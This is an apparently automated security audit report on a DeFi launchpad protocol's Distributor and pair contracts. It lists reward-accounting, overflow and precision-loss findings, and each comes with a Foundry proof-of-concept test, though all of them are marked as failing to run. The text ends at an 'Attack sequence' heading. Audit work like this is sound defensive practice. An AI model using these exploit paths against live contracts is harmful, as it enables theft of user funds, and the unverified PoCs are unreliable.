# 2025 08 gte perps - Findings Report
## Commit hash: f43e1eedb65e7e0327cfaf4d7608a37d85d2fae7

##Findings by Pattern


 **Derived From** : AccountingInvariantViolation

[H-1]. User rewards misdirected to Launchpad contract instead of user
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 3
Privilege: Permissionless
[M-2]. Accounting Overflow prevents Launching High-Supply Tokens
Finding Status: Valid
Status Confidence: SomeWhatConfident
Finding Confidence Justification: Launchpad code is not provided to confirm whether shares are 1:1 with token units or if it restricts supply/decimals; however, the documentation implies shares mirror token balances during bonding, making the overflow limit highly plausible.
Finding Complexity: 4
Privilege: Permissionless
[M-3]. Accounting Overflow prevents Launching High-Supply Tokens
Finding Status: Valid
Status Confidence: SomeWhatConfident
Finding Confidence Justification: Confidence is reduced because the exact share-scaling policy in the Launchpad is not shown. If the Launchpad deliberately scales shares (e.g., dividing token amounts), the overflow could be avoided. Absent that evidence, the issue is treated as valid.
Finding Complexity: 4
Privilege: Permissionless
[M-4]. Accounting Overflow in Distributor prevents launching high-supply tokens
Finding Status: Valid
Status Confidence: SomeWhatConfident
Finding Confidence Justification: The concrete mapping from purchased token amount to shares is performed in Launchpad/LaunchToken, which is not included here; it is assumed 1:1 or proportional. If shares were scaled down before calling increaseStake, overflow could be avoided. Absent evidence of such scaling in the provided code, the finding is treated as valid but with some uncertainty.
Finding Complexity: 4
Privilege: Permissionless



 **Derived From** : Issue Type: AccountingInvariantViolation / Precision loss in reward accumulator leads to permanent loss of rewards

[H-5]. Massive Reward Loss due to Insufficient Precision in RewardsTracker
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 5
Privilege: Permissionless



 **Derived From** : Balance: GTELaunchpadV2Pair.endRewardsAccrual

[M-6]. Accrued Launchpad Fees are Burned During Graduation
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 5
Privilege: Permissionless



 **Derived From** : Issue Type: PrecisionDriftAccumulation / Precision Loss leading to Stuck Funds

[M-7]. Precision Drift Permanently Locks Funds Preventing Skim
Finding Status: Valid
Status Confidence: Confident
Finding Complexity: 6
Privilege: Permissionless



 **Derived From** : SignatureMalleability

[L-8]. Malleable Permit Signature allows Front-running DoS
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 3
Privilege: Permissionless



 **Derived From** : PricePrecisionOrRoundingError

[H-9]. RewardsTrackerLib uses insufficient PRECISION_FACTOR (1e12) causing total loss of yield
Finding Status: Valid
Status Confidence: Confident
Finding Complexity: 7
Privilege: Permissionless



 **Derived From** : PermitDomainSeparator

[L-10]. Static DOMAIN_SEPARATOR allows Cross-Chain/Fork Replay
Finding Status: Valid
Status Confidence: Confident
Finding Complexity: 3
Privilege: Permissionless



 **Derived From** : ReserveOrPriceDesync

[M-11]. Accrued fees incorrectly counted as user input allowing Fee Theft
Finding Status: Valid
Status Confidence: Confident
Finding Complexity: 7
Privilege: Permissionless



 **Derived From** : Invariant Type: Arithmetic

[M-12]. Yield Theft and LP Dilution via `burn` During Fee Accrual
Finding Status: Valid
Status Confidence: Confident
Finding Complexity: 6
Privilege: Permissionless



 **Derived From** : Arithmetic Invariant: amount0 <= (balance0 - accruedLaunchpadFee0) * (liquidity / totalSupply)

[H-13]. Liquidity Providers can steal accrued Launchpad fees via burn, also causing DoS
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 6
Privilege: Permissionless



 **Derived From** : Invariant Type: Referential

[H-14]. Permanent DoS of Reward Claiming via Token Spoofing in Distributor
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 5
Privilege: Permissionless



 **Derived From** : Issue Type: ReserveOrPriceDesync / Missing Asset Validation in addRewards Enables Reward Theft

[H-15]. Asset Validation Bypass in addRewards Allows Reward Theft
Finding Status: Valid
Status Confidence: SomeWhatConfident
Finding Confidence Justification: The exploit path is clear from the provided code and matches standard reward-inflation bugs. Slight uncertainty stems from a generic "Lack of explicit asset validation" item listed in known OOS issues; however, that item is too broad to conclusively cover this specific bug here.
Finding Complexity: 4
Privilege: Permissionless



 **Derived From** : Issue Type: AccountingInvariantViolation

[H-16]. User Rewards Misdirected to Launchpad Contract
Finding Status: Valid
Status Confidence: SomeWhatConfident
Finding Confidence Justification: Launchpad.sol was not provided; if it reliably forwards the transferred rewards to the user/account every time, the practical impact would be mitigated. In absence of that proof, the bug stands as written. Therefore, marked valid with some uncertainty due to missing upstream caller logic.
Finding Complexity: 4
Privilege: Permissionless



 **Derived From** : Issue Type: UnsafeAssembyTypeCasts

[M-17]. Token Supply Cap of uint96 causes DoS or Reward Loss
Finding Status: Valid
Status Confidence: SomeWhatConfident
Finding Confidence Justification: The conclusion depends on how shares are derived in Launchpad/LaunchToken (not fully shown). If LaunchToken enforces a total supply <= uint96 or scales shares, the risk would be mitigated. Given the docs indicate permissionless launches and staking shares tied to token balances, and no visible cap/scale in the provided snippets, the risk is likely real but not proven with the missing Launchpad specifics.
Finding Complexity: 4
Privilege: Permissionless



 **Derived From** : RoundingError

[L-18]. Loss of Rewards due to Precision Loss in Tracker (Dust Accumulation)
Finding Status: Valid
Status Confidence: Confident
Finding Complexity: 3
Privilege: Permissionless


### Number of Findings
- C: 0
- H: 7
- M: 8
- L: 3
- I: 0

##Findings by Pattern


 **Derived From** : AccountingInvariantViolation

## [H-1]. User rewards misdirected to Launchpad contract instead of user

### Finding Severity Justification: increaseStake/decreaseStake compute a user’s pending rewards but _distributeAssets transfers those rewards to msg.sender. Since these functions are only callable by the Launchpad, rewards are sent to the Launchpad contract instead of the intended user account. This causes irreversible loss of accrued rewards for users on every stake/unstake action with existing shares. Direct loss of user assets merits High severity.
## Derived From Pattern/Invariant
AccountingInvariantViolation

## Exploit Type
StandardViolation

## Location
Distributor._distributeAssets

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 3
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
In `Distributor.sol`, the functions `increaseStake` and `decreaseStake` (called by `Launchpad`) trigger reward distribution via `_distributeAssets`. 

Code snippet:
```solidity
function _distributeAssets(address base, uint256 baseAmount, address quote, uint256 quoteAmount) internal {
    if (baseAmount > 0) base.safeTransfer(msg.sender, baseAmount);
    if (quoteAmount > 0) quote.safeTransfer(msg.sender, quoteAmount);
}
```
Since `increaseStake` is `onlyLaunchpad`, `msg.sender` is the `Launchpad` contract address. Consequently, all rewards earned by the user are transferred to the `Launchpad` contract rather than the `account` specified in the function arguments. Without a recovery mechanism in `Launchpad`, these funds are lost to the user.

## Impact
On every stake or unstake while a rewards pool is active, the user’s accrued rewards are transferred to the Launchpad contract because _distributeAssets uses msg.sender and increaseStake/decreaseStake are only callable by the Launchpad. totalPendingRewards is reduced accordingly, so these rewards cannot be claimed later by the user and cannot be skimmed by admin. Unless the Launchpad implements an explicit forwarding mechanism (not present here), users permanently lose their accrued rewards to the Launchpad contract. This results in direct and repeated loss of user rewards.

## Command to Run Test


## Proof of Concept
Scenario:
- Assume a rewards pool exists and a user already has shares.
- Some rewards are added to the pool via addRewards().
- Launchpad calls increaseStake(launchAsset, user, newShares) to add more shares for the user.
- RewardsTrackerLib.stake() computes the user’s pending rewards (baseAmount, quoteAmount) for existing shares.
- Distributor._distributeAssets(...) then transfers those rewards to msg.sender, which is the Launchpad (due to onlyLaunchpad), not to the user. totalPendingRewards is decremented, preventing later claims.
- Result: Rewards end up at the Launchpad; the user cannot recover them via claimRewards.


## Proof of Code
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {Distributor} from "contracts/launchpad/Distributor.sol";

import {ERC20} from "@openzeppelin/token/ERC20/ERC20.sol";

contract MintableERC20 is ERC20 {
    constructor(string memory n, string memory s) ERC20(n, s) {}
    function mint(address to, uint256 amt) external { _mint(to, amt); }
}

contract MisdirectedRewardsTest is Test {
    Distributor distributor;
    MintableERC20 base;
    MintableERC20 quote;

    address launchpad = address(0xBEEF);
    address user = address(0xA11CE);

    function setUp() public {
        distributor = new Distributor();
        distributor.initialize(launchpad);

        base = new MintableERC20("BASE", "BASE");
        quote = new MintableERC20("QUOTE", "QUOTE");

        // Create rewards pair (onlyLaunchpad)
        vm.prank(launchpad);
        distributor.createRewardsPair(address(base), address(quote));

        // Give user initial shares (onlyLaunchpad)
        vm.prank(launchpad);
        distributor.increaseStake(address(base), user, 100);

        // Fund rewards and approve distributor to pull them
        base.mint(address(this), 1000 ether);
        quote.mint(address(this), 2000 ether);
        base.approve(address(distributor), type(uint256).max);
        quote.approve(address(distributor), type(uint256).max);

        // Add rewards to the pool
        distributor.addRewards(address(base), address(quote), 100 ether, 200 ether);
    }

    function testMisdirectedRewardsOnStake() public {
        // Trigger distribution by modifying user's stake via Launchpad
        vm.prank(launchpad);
        (uint256 baseAmt, uint256 quoteAmt) = distributor.increaseStake(address(base), user, 1);

        assertGt(baseAmt, 0);
        assertGt(quoteAmt, 0);

        // Rewards were sent to msg.sender (Launchpad), not to the user
        assertEq(base.balanceOf(launchpad), baseAmt);
        assertEq(quote.balanceOf(launchpad), quoteAmt);
        assertEq(base.balanceOf(user), 0);
        assertEq(quote.balanceOf(user), 0);
    }
}


## Suggested Mitigation
Change _distributeAssets to accept an explicit recipient argument and use it for transfers. For increaseStake/decreaseStake, pass the user account as recipient; for claimRewards, pass msg.sender. Example:
- function _distributeAssets(address recipient, address base, uint256 baseAmount, address quote, uint256 quoteAmount) internal { ... base.safeTransfer(recipient, baseAmount); ... }
- increaseStake(..., address account, ...) { ... _distributeAssets(account, launchAsset, baseAmount, rs.quoteAsset, quoteAmount); }
- decreaseStake(..., address account, ...) { ... _distributeAssets(account, launchAsset, baseAmount, rs.quoteAsset, quoteAmount); }
- claimRewards(launchAsset) { (baseAmount, quoteAmount) = rs.claim(msg.sender); _distributeAssets(msg.sender, launchAsset, baseAmount, rs.quoteAsset, quoteAmount); }


## [M-2]. Accounting Overflow prevents Launching High-Supply Tokens

### Finding Severity Justification: RewardsTrackerLib and Distributor use uint96 for user shares and totalShares, capping aggregate stakable shares at ~7.9e28. For standard 18-decimal tokens, supplies above ~79B (commonly seen in memecoins) will cause staking to revert once cumulative shares approach this cap, halting further buys/bonding and effectively preventing such tokens from launching. This is a protocol availability/functional limitation rather than a direct asset-loss issue, fitting Medium per the rubric.
## Derived From Pattern/Invariant
AccountingInvariantViolation

## Exploit Type
AccountingInvariantViolation

## Location
Distributor.stake

## Finding Status: Valid
## Status Confidence: SomeWhatConfident
### Finding Confidence Justification: Launchpad code is not provided to confirm whether shares are 1:1 with token units or if it restricts supply/decimals; however, the documentation implies shares mirror token balances during bonding, making the overflow limit highly plausible.
### Finding Complexity: 4
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The `Distributor` and `RewardsTrackerLib` use `uint96` for `shares` and `totalShares`. The maximum value is ~7.9e28. Tokens with 18 decimals and supplies > 79 billion will exceed this when staked. Many meme coins have supplies in trillions (1e12 * 1e18 = 1e30). Calling `stake` with such amounts will revert due to overflow.

## Impact
Cumulative shares are stored in uint96 (max 2^96-1 ≈ 7.922e28 units). If shares map 1:1 to token units (18 decimals), the staking system hard-caps at ≈ 79.23 billion tokens worth of units. During bonding, typically ~80% of total supply is staked, so any token with total supply above ≈ 99.04 billion will cause increaseStake() to revert as totalShares approaches the uint96 cap, halting further buys and preventing graduation. This is a protocol availability/functional limitation (launchpad DoS for high-supply tokens), not a direct asset-loss vector.

## Command to Run Test


## Proof of Concept
Scenario: Shares track token units during bonding. totalShares and each user's shares are uint96. The system works until cumulative staked shares approach type(uint96).max, after which any further increaseStake reverts due to checked arithmetic overflow. For a token with 18 decimals, if bonding stakes ~80% of supply, supplies greater than ~99.04B will hit this cap before graduation, halting the launch.
Steps to exploit:
1) Initialize Distributor with yourself as launchpad and create a rewards pair for a launchAsset.
2) Call increaseStake(launchAsset, user, type(uint96).max) — succeeds, setting totalShares to max.
3) Call increaseStake(launchAsset, user, 1) — reverts due to uint96 overflow on userData.shares and totalShares.
This mirrors a real bonding process where many smaller stakes cumulatively reach the cap and then the next buy/stake reverts.

## Proof of Code
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {Distributor} from "contracts/launchpad/Distributor.sol";

contract OverflowSharesTest is Test {
    Distributor distributor;
    address launchAsset = address(0xA11CE);
    address quoteAsset = address(0xBEEF);
    address user = address(0xCAFE);

    function setUp() public {
        distributor = new Distributor();
        // Set this test contract as launchpad
        distributor.initialize(address(this));
        // Create a rewards pair so the pool exists
        distributor.createRewardsPair(launchAsset, quoteAsset);
    }

    function testSharesOverflowOnCumulativeStake() public {
        // First call: set totalShares to the maximum uint96 value
        distributor.increaseStake(launchAsset, user, type(uint96).max);
        // Next incremental stake causes overflow revert (checked arithmetic on uint96)
        vm.expectRevert();
        distributor.increaseStake(launchAsset, user, 1);
    }
}


## Suggested Mitigation
Use a wider type for shares and reward debts to eliminate the cap: change UserRewardData.shares, baseRewardDebt, quoteRewardDebt and RewardPoolData.totalShares from uint96 to at least uint128 (or uint256 for simplicity). Update all casts accordingly (remove uint96 casts in stake/unstake/claim) and ensure getAccRewardsPerShare divides by uint256(totalShares) rather than forcing it into a smaller type. If storage/gas is a concern, an alternative is to scale shares (e.g., define a shareScale per token and store shares = amount / shareScale), but this adds complexity—prefer widening types for correctness.


## [M-3]. Accounting Overflow prevents Launching High-Supply Tokens

### Finding Severity Justification: Using uint96 for shares and totalShares in RewardsTrackerLib caps aggregate staked shares at ~7.9e28 base units. For 18-decimal tokens this effectively limits stakable supply to ~79 billion tokens. Exceeding this bound triggers a checked arithmetic overflow and reverts, preventing staking updates and thereby breaking the launch flow (e.g., buy with auto-stake) for high-supply tokens. This is a protocol functionality failure without direct asset loss, fitting Medium per rubric.
## Derived From Pattern/Invariant
AccountingInvariantViolation

## Exploit Type
AccountingInvariantViolation

## Location
Distributor.increaseStake

## Finding Status: Valid
## Status Confidence: SomeWhatConfident
### Finding Confidence Justification: Confidence is reduced because the exact share-scaling policy in the Launchpad is not shown. If the Launchpad deliberately scales shares (e.g., dividing token amounts), the overflow could be avoided. Absent that evidence, the issue is treated as valid.
### Finding Complexity: 4
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The `Distributor` and `RewardsTrackerLib` use `uint96` for `shares` and `totalShares`. The maximum value is ~7.9e28. For a token with 18 decimals, this caps the supply at ~79 billion tokens. Many meme coins have supplies in the trillions or quadrillions. If such a token is launched, `increaseStake` will revert due to overflow when the total staked amount exceeds this cap, causing the `buy` function (if auto-staking) or manual staking to fail.

## Impact
Using uint96 for shares and totalShares hard-caps the aggregate stake at 2^96-1 ≈ 7.92e28 base units. For 18‑decimal tokens this is ~7.9e10 tokens (≈79B). High-supply launches (e.g., 1e12, 1e15 tokens at 18 decimals) will hit this ceiling during auto-stake or subsequent staking, causing checked arithmetic to revert in RewardsTrackerLib.stake (userData.shares += newShares; self.totalShares += newShares). This bricks buy-with-autostake flows and prevents further staking updates once the cap is reached. Additionally, baseRewardDebt/quoteRewardDebt are uint96 and can also overflow if accRewardPerShare * shares grows large, compounding the risk. No direct asset loss occurs, but the protocol’s launch and rewards functionality can be rendered unusable for high-supply tokens.

## Command to Run Test


## Proof of Concept
A rewards pool’s shares and totalShares are uint96. Each increaseStake() call adds newShares to userData.shares and to totalShares using checked arithmetic. Once the cumulative shares reach 2^96-1, any further staking reverts, halting the launch flow where buys auto-stake. This is reproducible even without adding rewards: 1) Initialize Distributor and set its launchpad. 2) Create a rewards pair to initialize the pool. 3) As launchpad, call increaseStake with newShares = type(uint96).max for user1 (fills the cap). 4) Any subsequent increaseStake (even 1 share) for another user reverts due to totalShares overflow. For 18‑decimal high-supply tokens where shares are proportional to token amount (typical for launchpads), this cap is hit well before the total supply is staked (e.g., 1e12 tokens exceeds the ~7.9e10 cap).

## Proof of Code
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {Distributor} from "contracts/launchpad/Distributor.sol";

contract DistributorOverflowTest is Test {
    Distributor distributor;
    address launchpad = address(this);
    address launchAsset = address(0xBEEF);
    address quoteAsset = address(0xCAFE);
    address user1 = address(0x1111);
    address user2 = address(0x2222);

    function setUp() public {
        distributor = new Distributor();
        // Set launchpad so we can call onlyLaunchpad functions
        distributor.initialize(launchpad);
        // Initialize the rewards pool (onlyLaunchpad)
        distributor.createRewardsPair(launchAsset, quoteAsset);
    }

    // Demonstrates that the uint96 cap on totalShares causes a revert once exceeded.
    function test_TotalSharesOverflowReverts() public {
        // Fill totalShares to the uint96 maximum in a single stake
        distributor.increaseStake(launchAsset, user1, type(uint96).max);

        // Any further staking will overflow totalShares and revert (checked arithmetic)
        vm.expectRevert();
        distributor.increaseStake(launchAsset, user2, 1);
    }
}


## Suggested Mitigation
Option A (recommended for simplicity and safety): widen all share/debt fields to uint256.
- Change UserRewardData.shares/baseRewardDebt/quoteRewardDebt and RewardPoolData.totalShares to uint256.
- Update arithmetic to use uint256 throughout; remove casts to uint96 in RewardsTrackerLib.
- In getAccRewardsPerShare(), divide by uint256(totalShares) (no uint128 cast).
This removes the ~7.9e28 base-unit ceiling and avoids debt overflow as accRewardPerShare grows.

Option B (if storage packing is critical): introduce share scaling.
- Keep storage types but define a SHARE_SCALER (e.g., 1e6 or 1e12) and compute shares = rawAmount / SHARE_SCALER consistently across staking and reward-debt math.
- Ensure all reward debt calculations and accRewardPerShare semantics are aligned with the scaled share unit; document rounding behavior.

In both options, also ensure baseRewardDebt/quoteRewardDebt types can safely hold totalAccRewards(shares, accRewardsPerShare) over the asset’s lifecycle to prevent debt overflow.


## [M-4]. Accounting Overflow in Distributor prevents launching high-supply tokens

### Finding Severity Justification: Using uint96 for shares and totalShares hard-caps aggregate stakable units at ~7.9e28. For 18-decimal tokens this corresponds to ~79B tokens. Exceeding this causes arithmetic downcast/overflow reverts in stake(), making increaseStake (and thus launchpad buy/transfer-based staking) fail. No funds are directly stolen, but a major protocol function (launching and staking for high-supply tokens) becomes unavailable, constituting a functional DoS. This matches Code4rena Medium: protocol function/availability impact without direct asset loss.
## Derived From Pattern/Invariant
AccountingInvariantViolation

## Exploit Type
AccountingInvariantViolation

## Location
RewardsTrackerLib.stake

## Finding Status: Valid
## Status Confidence: SomeWhatConfident
### Finding Confidence Justification: The concrete mapping from purchased token amount to shares is performed in Launchpad/LaunchToken, which is not included here; it is assumed 1:1 or proportional. If shares were scaled down before calling increaseStake, overflow could be avoided. Absent evidence of such scaling in the provided code, the finding is treated as valid but with some uncertainty.
### Finding Complexity: 4
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The `Distributor` contract and `RewardsTrackerLib` use `uint96` for `shares` and `totalShares`. The maximum value for `uint96` is approximately 7.9e28. Launchpad tokens typically have 18 decimals. If a token project is launched with a total supply exceeding roughly 79 billion tokens (7.9e10 * 1e18), the `totalShares` variable will overflow during the staking process (triggered by `Launchpad.buy` or token transfers). Since Solidity 0.8.x reverts on overflow, this causes the `increaseStake` function to revert, effectively DoS-ing the launchpad buy function and preventing the launch of high-supply tokens (e.g., meme coins with trillion/quadrillion supplies).

## Impact
Because shares and totalShares are uint96, any launch whose per-account stake or aggregate stake would exceed 2^96-1 (~7.92e28) will revert. For 18-decimal tokens this caps stakable supply at ~79.2B tokens. Two concrete failure modes arise: (1) casting a uint256 token amount to uint96 shares in the Launchpad path will panic if the amount exceeds the uint96 range, preventing staking from starting; and (2) even if initial stakes succeed, once totalShares approaches the cap, any further increaseStake will revert on addition. Additionally, baseRewardDebt and quoteRewardDebt are also uint96 and can overflow for large shares/reward-per-share values, causing stake/unstake/claim to revert. The result is a functional DoS for high-supply tokens and for pools that organically reach the cap, without direct loss of funds.

## Command to Run Test


## Proof of Concept
Scenario A (large supply cast revert):
- A token is launched with total supply 100B (1e11) and 18 decimals. Launchpad attempts to stake the purchased amount as shares.
- The staking path must downcast the purchased uint256 token amount (1e11 * 1e18 = 1e29) to uint96 to call Distributor.increaseStake(..., uint96 shares).
- Solidity 0.8.x panics on downcast overflow, so the conversion to uint96 reverts and the staking/launch flow fails.

Scenario B (aggregate overflow at cap):
- Assume an existing pool where totalShares is already near type(uint96).max.
- Any subsequent buy/transfer-based staking that calls Distributor.increaseStake will call RewardsTrackerLib.stake, which executes `self.totalShares += newShares`.
- The addition overflows uint96 and reverts, halting further staking for that pool.

## Proof of Code
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {Distributor} from "contracts/launchpad/Distributor.sol";
import {RewardsTrackerStorage, RewardPoolData} from "contracts/launchpad/libraries/RewardsTracker.sol";

contract AccountingOverflowTest is Test {
    Distributor dist;
    address launchAsset = address(0x1000);
    address quoteAsset = address(0x2000);
    address alice = address(0xA11CE);

    function setUp() public {
        // Set up Distributor and authorize this test as the launchpad
        dist = new Distributor();
        dist.initialize(address(this));
        dist.createRewardsPair(launchAsset, quoteAsset);
    }

    // Demonstrates overflow in RewardsTrackerLib.stake when totalShares is at the cap
    function test_increaseStake_overflow_totalShares() public {
        RewardPoolData storage p = RewardsTrackerStorage.getRewardPool(launchAsset);
        // Simulate a pool that has already accumulated near-max shares
        p.totalShares = type(uint96).max - 1;
        vm.expectRevert(); // Arithmetic overflow when adding 2 to uint96 max-1
        dist.increaseStake(launchAsset, alice, 2);
    }

    // Demonstrates the downcast panic when converting a high-supply token amount to uint96 shares
    function test_cast_revert_when_computing_shares_from_token_amount() public {
        uint256 huge = 100_000_000_000 * 1e18; // 100B tokens with 18 decimals => 1e29
        vm.expectRevert(); // Panic on downcast to uint96
        uint96 s = uint96(huge);
        s; // silence warning
    }
}


## Suggested Mitigation
Use wider integer widths for all stake-related accounting: change shares, totalShares, baseRewardDebt, and quoteRewardDebt from uint96 to uint256 (or at least uint128). This removes the ~79.2B (18-decimal) cap and prevents reward-debt casts from overflowing under large per-share accumulations. If storage packing is a concern, uint128 is sufficient for any realistic ERC20 amount range while still fitting comfortably. Alternatively, introduce a configurable share-scaling factor (e.g., shares = amount / 1eX) to normalize 18-decimal amounts into a bounded range, but this introduces precision trade-offs and complexity; preferring uint256 is simpler and safer.





 **Derived From** : Issue Type: AccountingInvariantViolation / Precision loss in reward accumulator leads to permanent loss of rewards

## [H-5]. Massive Reward Loss due to Insufficient Precision in RewardsTracker

### Finding Severity Justification: accRewardPerShare uses a fixed 1e12 precision while totalShares can be ~1e24 (18-dec tokens). For common scenarios (e.g., USDC 6 decimals as rewards, 18-dec shares), (pending * 1e12) / totalShares underflows to 0. The update() function then deletes pending rewards, making them permanently unclaimable. This can affect real, non-dust amounts and leads to irrevocable loss of user rewards locked in the contract.
## Derived From Pattern/Invariant
Issue Type: AccountingInvariantViolation / Precision loss in reward accumulator leads to permanent loss of rewards

## Exploit Type
ERC20DecimalsMismatch

## Location
RewardsTracker.sol.update

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 5
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The `RewardsTrackerLib` uses a hardcoded `PRECISION_FACTOR` of `1e12` to calculate `accRewardPerShare`. The formula used is `(pending * 1e12) / totalShares`. 

If the staking token is a standard 18-decimal token with a reasonable supply (e.g., 1 million tokens = 1e24 wei) and the reward token is a low-decimal token like USDC (6 decimals), the calculation suffers from catastrophic precision loss. For instance, a reward injection of 1,000 USDC (1e9 wei) results in `1e9 * 1e12 = 1e21`. Dividing `1e21` by `1e24` yields 0. The `pending` rewards are cleared from the queue but `accRewardPerShare` is not incremented, causing the rewards to be permanently lost from the perspective of stakers.

## Impact
When accRewardPerShare uses a fixed 1e12 precision and totalShares is large (e.g., 18‑dec shares on the order of 1e24), many realistic reward top-ups (e.g., 6‑dec USDC fees) will produce (pending * 1e12) / totalShares == 0. On any update-triggering action (stake/unstake/claim), pending rewards are deleted while accRewardPerShare does not increase, making those rewards permanently unclaimable. The tokens remain locked in the Distributor (counted in totalPendingRewards and thus not skimmable). The threshold for loss is: pending < ceil(totalShares / 1e12) smallest units of the reward token. For example, with totalShares = 1e24 and USDC (6 decimals), any pending < 1e12 (i.e., < 1,000,000 USDC) will be wiped on update, causing persistent, unrecoverable user reward loss.

## Command to Run Test


## Proof of Concept
Repro steps:
1) Deploy Distributor and set launchpad to the caller via initialize(address(this)).
2) Create a rewards pair: createRewardsPair(launchAsset (18 decimals), usdc (6 decimals)).
3) As launchpad, credit a user with shares: increaseStake(launchAsset, user, 1e24) to simulate 1,000,000 tokens worth of shares.
4) Mint 100 USDC (100e6) to the caller and approve the Distributor. Call addRewards(launchAsset, usdc, 0, 100e6). This transfers 100 USDC into the Distributor and increases totalPendingRewards[usdc] by 100e6.
5) From the user address, call claimRewards(launchAsset) to trigger RewardsTrackerLib.update(). Since (100e6 * 1e12) / 1e24 = 0, accQuoteRewardPerShare does not increase, but pendingQuoteRewards is deleted.
6) The claim returns quoteAmount = 0, yet totalPendingRewards[usdc] still includes the 100 USDC that is now stuck in the contract and no longer distributable to stakers.

## Proof of Code
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {Distributor} from "contracts/launchpad/Distributor.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract MockERC20Decimals is ERC20 {
    uint8 private _decimals;
    constructor(string memory n, string memory s, uint8 d) ERC20(n, s) { _decimals = d; }
    function decimals() public view override returns (uint8) { return _decimals; }
    function mint(address to, uint256 amount) external { _mint(to, amount); }
}

contract RewardsPrecisionLossTest is Test {
    Distributor distributor;
    MockERC20Decimals launchAsset;
    MockERC20Decimals usdc;

    address user = address(0xBEEF);

    function setUp() public {
        distributor = new Distributor();
        distributor.initialize(address(this)); // set this contract as launchpad

        launchAsset = new MockERC20Decimals("Launch", "LA", 18);
        usdc = new MockERC20Decimals("USD Coin", "USDC", 6);

        // Create rewards pair (onlyLaunchpad)
        distributor.createRewardsPair(address(launchAsset), address(usdc));
    }

    function test_PrecisionLoss_RewardsAreWipedAndStuck() public {
        // 1) Add shares for user (onlyLaunchpad)
        uint96 stakeShares = uint96(1e24); // 1,000,000 * 1e18
        distributor.increaseStake(address(launchAsset), user, stakeShares);

        // 2) Add 100 USDC rewards
        uint128 rewardAmount = uint128(100e6);
        usdc.mint(address(this), rewardAmount);
        usdc.approve(address(distributor), type(uint256).max);
        distributor.addRewards(address(launchAsset), address(usdc), 0, rewardAmount);

        // 3) User claims to trigger update() which deletes pending due to zero increment
        vm.startPrank(user);
        (uint256 baseAmt, uint256 quoteAmt) = distributor.claimRewards(address(launchAsset));
        vm.stopPrank();

        assertEq(quoteAmt, 0, "Expected zero rewards due to precision loss");
        assertEq(baseAmt, 0, "No base rewards expected in this test");

        // Rewards are stuck in Distributor and counted as pending (cannot be skimmed)
        assertEq(distributor.totalPendingRewards(address(usdc)), rewardAmount, "USDC stuck in contract pending map");
        assertEq(usdc.balanceOf(address(distributor)), rewardAmount, "USDC physically stuck in Distributor");
    }
}


## Suggested Mitigation
Two complementary fixes are recommended:
- Precision and arithmetic: increase precision and use full-precision mulDiv. Set PRECISION_FACTOR to 1e36 (or similar) and compute increments using a 256-bit safe mulDiv: increment = Math.mulDiv(pending, PRECISION_FACTOR, totalShares). Consider widening pendingBaseRewards/Quote to uint256 to avoid overflow with larger PRECISION_FACTOR.
- Do not delete undistributed remainder: in update(), only clear the portion of pending that was actually distributed. Compute distributed = Math.mulDiv(increment, totalShares, PRECISION_FACTOR) and then: acc += increment; pending -= distributed. If increment == 0, leave pending untouched so it accumulates until distribution becomes feasible. This guarantees no reward loss even under extreme decimals/supply mismatches.
Optionally, normalize shares or rewards based on token decimals at pool initialization to reduce scale mismatches.





 **Derived From** : Balance: GTELaunchpadV2Pair.endRewardsAccrual

## [M-6]. Accrued Launchpad Fees are Burned During Graduation

### Finding Severity Justification: Accrued launchpad swap fees intended for stakers are deterministically lost at graduation: GTELaunchpadV2Pair.endRewardsAccrual() deletes accruedLaunchpadFee0/1 before any distribution and then updates reserves in the same block, absorbing those tokens into pool reserves. This causes loss of matured fee yield to stakers but does not enable theft of principal funds. Impact is bounded by the final graduation swap and the defined fee share, making it a material but not catastrophic loss.
## Derived From Pattern/Invariant
Balance: GTELaunchpadV2Pair.endRewardsAccrual

## Exploit Type
AccountingInvariantViolation

## Location
GTELaunchpadV2Pair.endRewardsAccrual

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 5
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
When a token graduates from the Launchpad, `Distributor.endRewards` calls `GTELaunchpadV2Pair.endRewardsAccrual`. This function unconditionally deletes `accruedLaunchpadFee0` and `accruedLaunchpadFee1` without distributing them.

The graduation process involves an atomic transaction where the remaining bonding curve inventory is swapped into the pair. This swap generates fees which are stored in `accruedLaunchpadFee` (since `timeElapsed` is likely 0 in the atomic transaction sequence, or simply due to the update logic). These fees are then immediately deleted by the subsequent call to `endRewardsAccrual`.

## Impact
Accrued launchpad swap fees generated in the same block as graduation are zeroed and absorbed into pair reserves instead of being distributed to stakers via the Distributor. Practically, this affects the (typically large) final graduation swap(s) and any other same-block swaps before `endRewardsAccrual()`. The loss is bounded to the rewards fee share of the final inputs times the launchpad LP share, but is irreversible: those tokens become part of the pool reserves and are claimable by LPs rather than stakers.

## Command to Run Test


## Proof of Concept
Root cause: In the same block as the graduation swap, `_update()` accrues fees to `accruedLaunchpadFee{0,1}` (timeElapsed == 0) but does not distribute them. Immediately after, `endRewardsAccrual()` (called by the Distributor) deletes `accruedLaunchpadFee{0,1}` and then calls `_update()` with zeros. This re-syncs reserves without subtracting any fees, effectively absorbing the previously accrued fees into pool reserves.

Attack sequence (single transaction / same block):
